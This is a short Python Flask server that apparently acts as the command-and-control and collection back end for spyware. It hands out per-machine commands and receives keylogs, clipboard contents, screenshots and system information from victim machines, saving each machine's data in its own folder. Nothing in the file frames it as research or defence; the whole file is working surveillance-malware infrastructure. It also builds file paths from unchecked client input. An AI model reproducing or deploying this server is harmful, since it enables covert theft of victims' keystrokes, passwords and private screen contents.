from flask import Flask, request, jsonify
import os

app = Flask(__name__)
UPLOAD_FOLDER = 'C:/Users/Hiba/Desktop/Server/upload'
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

# Initialize the command storage
machine_commands = {}


@app.route('/command/<machine_id>', methods=['GET', 'POST'])
def handle_command(machine_id):
    global machine_commands
    if request.method == 'POST':
        command = request.json.get('command', 'RUN')
        machine_commands[machine_id] = command
    current_command = machine_commands.get(machine_id, 'RUN')  # Default to 'RUN' if no command set
    return jsonify({'current_command': current_command})


@app.route('/upload', methods=['POST'])
def upload_file():
    machine_id = request.form['machine_id']
    file_type = request.form['file_type']
    if 'file' not in request.files:
        return 'No file part', 400
    file = request.files['file']
    if file.filename == '':
        return 'No selected file', 400
    if file:
        machine_folder = os.path.join(app.config['UPLOAD_FOLDER'], machine_id)
        os.makedirs(machine_folder, exist_ok=True)

        file_path = os.path.join(machine_folder, file.filename)

        # Handle system information separately
        if file_type == 'system':
            if not os.path.exists(file_path):
                file.save(file_path)
            return 'System info uploaded', 200
        elif file_type in ['keylog', 'clipboard']:
            # Append to existing file or create new
            with open(file_path, 'ab') as f:
                f.write(file.read())
            return 'Data appended successfully', 200
        elif file_type == 'screenshot':
            # Save screenshot with unique names
            file.save(file_path)
            return 'Screenshot uploaded successfully', 200

    return 'File successfully uploaded', 200


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, threaded=True)
